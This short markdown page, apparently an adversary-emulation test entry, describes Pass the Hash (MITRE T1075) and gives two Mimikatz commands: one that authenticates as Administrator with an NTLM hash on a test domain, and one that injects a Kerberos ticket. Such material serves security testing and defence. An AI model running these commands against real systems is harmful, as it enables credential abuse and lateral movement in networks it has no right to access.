## Pass the Hash

MITRE ATT&CK Technique: [T1075](https://attack.mitre.org/wiki/Technique/T1075)

#### Mimikatz

Note: must dump hashes first

`mimikatz # sekurlsa::pth /user:Administrator /domain:atomic.local /ntlm:cc36cf7a8514893efccd3324464tkg1a`

[Reference](https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth)

#### Kerberos Ticket attack

`mimikatz # kerberos::ptt Administrator@krbtgt-atomic.LOCAL.kirbi`
